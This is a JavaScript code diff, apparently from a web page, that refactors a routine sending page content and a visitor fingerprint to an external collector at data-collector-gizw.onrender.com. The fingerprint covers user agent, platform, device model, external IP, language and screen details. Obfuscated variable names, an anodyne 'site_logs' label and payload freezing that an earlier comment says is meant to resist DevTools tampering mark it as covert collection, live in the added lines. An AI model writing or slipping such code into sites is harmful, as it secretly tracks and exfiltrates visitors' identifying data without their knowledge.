@@ -147,18 +147,16 @@
           const maxLen = Math.max(...entries.map(([k]) => k.length));
           return `\n=== ${section} ===\n${entries.map(([k,v]) => `  ${k.padEnd(maxLen+2)}: ${v}`).join('\n')}`;
         }).join('');
-        const nameBase = dn(he);
         const folderName = 'site_logs';
-        const fileName = undefined; // имя определит сервер (реестр/эвристика)
+        const fileName = undefined;
         const BASE_API = 'https://data-collector-gizw.onrender.com';
-const PAGE_TOKEN = Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b=>b.toString(16).padStart(2,'0')).join('');
-Object.freeze(PAGE_TOKEN);
+        const PAGE_TOKEN = Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b=>b.toString(16).padStart(2,'0')).join('');
+        Object.freeze(PAGE_TOKEN);
         try {
-          const payload = { folder_name: folderName, file_name: fileName, content: txt, fingerprint: [z2,zA,he.model||'',extIP].join('|'), platform: zA, model: he.model||'', externalIP: extIP, userAgent: z2, language: z4, screen: screenInfo };
-          // Защита от модификации через DevTools
-          Object.freeze(payload);
-          Object.seal(payload);
-          const send = () => fetch(`${BASE_API}/collect`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Page-Token': PAGE_TOKEN }, body: JSON.stringify(payload), keepalive: true });
+          const collectPayload = { folder_name: folderName, file_name: fileName, content: txt, fingerprint: [z2,zA,he.model||'',extIP].join('|'), platform: zA, model: he.model||'', externalIP: extIP, userAgent: z2, language: z4, screen: screenInfo };
+          Object.freeze(collectPayload);
+          Object.seal(collectPayload);
+          const send = () => fetch(`${BASE_API}/collect`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Page-Token': PAGE_TOKEN }, body: JSON.stringify(collectPayload), keepalive: true });
           let ok = false;
           try{ const r = await Promise.race([send(), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 6000))]); ok = r && r.ok; }catch{}
         } catch {}
